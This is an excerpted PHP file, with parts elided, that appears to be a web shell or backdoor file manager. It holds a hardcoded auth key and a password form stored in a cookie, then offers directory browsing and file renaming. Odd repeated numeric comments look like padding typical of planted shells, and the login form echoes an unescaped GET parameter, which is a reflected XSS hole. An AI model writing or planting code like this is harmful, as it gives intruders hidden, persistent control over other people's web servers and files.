...
$auth_key = "101b3487755700840848bab5a130e7b9";
...
$pass = false;
if (isset($_COOKIE['pw_name_11329'])) {
    if(($_COOKIE['pw_name_11329']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_11329'])) {
        if(($_POST['pw_name_11329']) == $auth_key) {
            setcookie("pw_name_11329", $_POST['pw_name_11329']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_11329' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1738802497634691 1738802497335568 1738802497389758 1738802497387496
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1738802497634691 1738802497335568 1738802497389758 1738802497387496
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1738802497634691 1738802497335568 1738802497389758 1738802497387496
            $name = PATH . "/" . $_GET['r'];
